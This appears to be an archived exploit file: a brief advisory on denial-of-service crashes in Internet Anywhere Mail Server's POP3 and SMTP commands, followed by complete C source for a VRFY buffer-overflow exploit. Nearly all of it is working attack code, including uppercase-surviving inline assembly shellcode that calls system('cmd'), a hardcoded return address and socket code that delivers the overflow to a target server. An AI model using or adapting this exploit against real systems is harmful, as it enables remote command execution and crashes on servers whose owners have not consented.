@@ -1,0 +1,216 @@
+source: http://www.securityfocus.com/bid/730/info
+
+True North Software's Internet Anywhere Mail Server has various weaknesses that could allow an attacker to remotely crash the server running this software.. The POP3 commands "list", "retr" .uidl" and "user" and the SMTP command "vrfy", if sent with abnormally long arguments, will crash the server. These limits seem to be around 200 characters for the POP3 commands, and around 250 characters for the SMTP command.
+
+Currently, these problems have only been reliably remotely exploited as DoS attacks, however, it is conceivable that a remote shell exploit could be created.
+
+// iamexploit.c - by Arne Vidstrom - http://www.bahnhof.se/~winnt/
+ //
+ // This exploit code starts the Command Prompt on a remote computer
+ // running Internet Anywhere Mail Server version 2.3.1, build 10020.
+ // However, it is very dependent on different DLL versions installed
+ // on the server computer. This code exploits a vrfy buffer overflow
+ // in the SMTP part of the mail server.
+ //
+
+ #include <stdio.h>
+ #include <windows.h>
+ #include <winsock.h>
+ #include <string.h>
+
+ #define sockaddr_in struct sockaddr_in
+ #define sockaddr struct sockaddr
+
+ // Server IP address
+ char ipaddr[25] = "xxx.xxx.xxx.xxx";
+ // Server port, the default is 25
+ unsigned short port = xxxxx;
+
+ // Payload machine code size and location
+ DWORD stop, start, size;
+ // The overflow string
+ unsigned char s[251];
+
+ // This function contains the payload assembly code and some extra
+ // code to support dynamic loading of the payload
+ BOOL createPayload(void)
+ {
+         DWORD point1, point2;
+
+         __asm {
+                 // First checkpoint for code location
+                 MOV  point1, $
+                 JMP  AFTER
+                 // Exploit payload starts here ->>
+                 // Set up a new stack frame, but there's no need to push EBP
+                 // since we'll never return from here
+                 MOV      EBP, ESP
+                 // Manipulate the null terminated string "cmd" into ESI
+                 // and push it onto the stack - we can't just move it into
+                 // memory with three MOV BYTE PTR's because the machine code
+                 // they generate will be destroyed when the mail server
+                 // convert the string to uppercase
+                 MOV  ESI, 0FF646d63h
+                 AND  ESI, 0F0FFFFFFh
+                 AND  ESI, 0FFFFFFFh
+                 PUSH ESI
+                 // Manipulate the system() function's entry address into ESI
+                 // the same way as we did with the "cmd" string and push it
+                 // onto the stack too - 7801C1A0h only works for version
+                 // 5.00.7128 of the DLL msvcrt.dll
+                 MOV  ESI, 7801C1A0h
+                 MOV  EBX, 20FFFFFFh
+                 AND  EBX, 0FF0F0F0Fh
+                 AND  EBX, 0FFF0F0F0h
+                 OR   ESI, EBX
+                 AND  ESI, 0FFFFDFFFh
+                 PUSH ESI
+                 // Load the address to the "cmd" string into EAX and push it
+                 // onto the stack for use by system() below
+                 LEA  EAX, [EBP-04h]
+                 PUSH EAX
+                 // Call system() which starts the Command Prompt
+                 CALL DWORD PTR [EBP-8h]
+                 // Infinite loop - the server won't crash when the Command
+                 // Prompt is closed, and it will also continue responding
+                 // to more clients, though CPU usage will be 100%
+                 LABEL1:
+                 JMP  LABEL1
+                 // <<- Exploit payload ends here
+                 // Second checkpoint for code location
+                 AFTER:
+                 MOV  point2, $
+         }
+         // Calculate payload size and location
+         size = point2 - point1 - 12;
+         start = point1 + 12;
+         stop = point2;
+         // Payload size vs. server buffer size overflow check
+         if (size > 75)
+                 return FALSE;
+         else
+                 return TRUE;
+ }
+
+ // Create the vrfy overflow string
+ void createOverflow(void)
+ {
+         unsigned char payload[236];
+         unsigned char fillout[236];
+         unsigned char ret[5];
+         unsigned int i;
+         unsigned long temp;
+         unsigned char *p;
+
+         // Create a string containing the payload
+         temp = start;
+         for (i=0; i<size; i++) {
+                 p = (unsigned char*) temp;
+                 payload[i] = *p;
+                 temp++;
+         }
+         payload[i] = '\0';
+         // Fill out with some 'a' until we hit the function return
+         // address on the stack
+         i = strlen(payload);
+         while (i<235) {
+                 fillout[i-strlen(payload)] = 'a';
+                 i++;
+         }
+         fillout[i-strlen(payload)] = '\0';
+         // Overwrite the return address to the location of the payload
+         // inside the buffer
+         ret[0] = 0x45;
+         ret[1] = 0xF4;
+         ret[2] = 0xF1;
+         ret[3] = 0x01;
+         ret[4] = 0x00;
+         // Put together the whole vrfy overflow string
+         strcpy(s, "vrfy xxxxx");
+         strcat(s, payload);
+         strcat(s, fillout);
+         strcat(s, ret);
+         strcat(s, "\r\n");
+         printf("Created overflow string.\n");
+ }
+
+ // Connect to the server, say hi and then send the overflow string
+ void sendOverflow(void)
+ {
+         SOCKET socket1;
+         WSADATA winSockData;
+         sockaddr_in peer;
+         int flags;
+         int result;
+         char buffer[1024];
+
+         // Allocate a socket, connect and stuff...
+         WSAStartup(0x0101, &winSockData);
+         socket1 = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+         peer.sin_family = AF_INET;
+         peer.sin_port = htons(port);
+         peer.sin_addr.s_addr = inet_addr(ipaddr);
+         result = connect(socket1, (sockaddr *) &peer, sizeof(peer));
+         if (result != 0) {
+                 printf("Couldn't connect to the server!\n");
+                 closesocket(socket1);
+                 WSACleanup();
+         }
+         else {
+                 // Wait for the server to give us the welcome message, this
+                 // is a bit simplified because we can't expect the whole
+                 // message in one recv, but it will do in this case
+                 flags = 0;
+                 result = recv(socket1, buffer, 1024, flags);
+                 // Say hi to the server
+                 flags = 0;
+                 result = send(socket1, "helo\r\n", strlen("helo\r\n"), flags);
+                 // Wait for the server to say ok, the same as above goes here
+                 flags = 0;
+                 result = recv(socket1, buffer, 1024, flags);
+                 // Send the overflow string to the server
+                 flags = 0;
+                 result = send(socket1, s, strlen(s), flags);
+                 if (result != SOCKET_ERROR)
+                         printf("Overflow sent to the server.\n");
+                 // Wait a couple of seconds
+                 Sleep(2000);
+                 // Clean up
+                 closesocket(socket1);
+                 WSACleanup();
+         }
+ }
+
+ // Guess what this is :o)
+ int main(void)
+ {
+         DWORD temp;
+         unsigned char *p;
+
+         printf("\niamexploit.c - by Arne Vidstrom -
+ http://www.bahnhof.se/~winnt/\n\n");
+         // Generate payload machine code and check size
+         if (!createPayload()) {
+                 printf("ERROR: The payload machine code generated will not fit in the
+ buffer!\n");
+                 return 1;
+         }
+         else
+                 printf("%ld bytes of payload machine code generated.\n", size);
+         // Check for null characters in the payload
+         for (temp=start; temp<stop; temp++) {
+                 p = (unsigned char*) temp;
+                 if (*p == 0) {
+                         printf("ERROR: The payload machine code generated contains the null
+ character!\n");
+                         return 1;
+                 }
+         }
+         printf("Payload ok.\n");
+         // Create the overflow string
+         createOverflow();
+         // Send the overflow string to the server
+         sendOverflow();
+         printf("Over and out!\n\n");
+         return 0;
+ }
